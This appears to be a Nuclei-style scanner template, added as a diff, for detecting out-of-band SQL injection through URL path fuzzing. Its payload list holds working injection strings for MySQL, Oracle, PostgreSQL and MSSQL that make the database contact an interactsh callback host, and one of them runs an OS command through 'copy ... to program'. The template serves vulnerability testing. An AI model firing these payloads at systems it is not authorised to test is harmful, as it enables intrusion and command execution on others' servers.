@@ -1,0 +1,56 @@
+id: oob-sql-path
+
+info:
+  name: OOB SQL Injection Detection
+  author: reewardius
+  severity: high
+  reference:
+    - https://github.com/bugcrowd/HUNT/blob/master/ZAP/scripts/passive/SSRF.py
+    - https://sanderwind.medium.com/escalating-ssrf-to-rce-7c0147371c40
+    - https://twitter.com/hacker_/status/1694554718574710865
+  tags: fuzzing-req,fuzzing-req-oob,fuzzing-req-path,dast
+  
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+          
+    payloads:
+      oob:
+        - '" LOAD_FILE("\\\\{{interactsh-url}}\\a")--'
+        - "' LOAD_FILE('\\\\{{interactsh-url}}\\a')--"
+        - '" UNION SELECT UTL_INADDR.get_host_address("{{interactsh-url}}")--'
+        - '" copy (SELECT "") to program "nslookup {{interactsh-url}}"--'
+        - '" exec master..xp_dirtree "//{{interactsh-url}}/a"--'
+        - '"+UNION+SELECT+extractvalue(xmltype("<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//{{interactsh-url}}/">+%25remote%3b]>"),"/l")+FROM+dual--'
+        - '"; LOAD_FILE("\\\\{{interactsh-url}}\\a")--'
+        - '"; UNION SELECT UTL_INADDR.get_host_address("{{interactsh-url}}")--'
+        - '"; copy (SELECT '') to program "nslookup {{interactsh-url}}"--'
+        - '"; exec master..xp_dirtree "//{{interactsh-url}}/a"--'
+        - '" LOAD_FILE("\\\\{{interactsh-url}}\\a")--'
+        - "' UNION SELECT UTL_INADDR.get_host_address('{{interactsh-url}}')--"
+        - "' copy (SELECT '') to program 'nslookup {{interactsh-url}}'--"
+        - "' exec master..xp_dirtree '//{{interactsh-url}}/a'--"
+        - "'; LOAD_FILE('\\\\{{interactsh-url}}\\a')--"
+        - "'; UNION SELECT UTL_INADDR.get_host_address('{{interactsh-url}}')--"
+        - "'; copy (SELECT '') to program 'nslookup {{interactsh-url}}'--"
+        - "'; exec master..xp_dirtree '//{{interactsh-url}}/a'--"
+        - "LOAD_FILE('\\\\{{interactsh-url}}\\a')--"
+        - "UNION SELECT UTL_INADDR.get_host_address('{{interactsh-url}}')--"
+        - "copy (SELECT '') to program 'nslookup {{interactsh-url}}'--"
+        
+    fuzzing:
+      - part: path
+        mode: single
+        type: postfix
+        fuzz:
+          - "{{oob}}"
+          
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
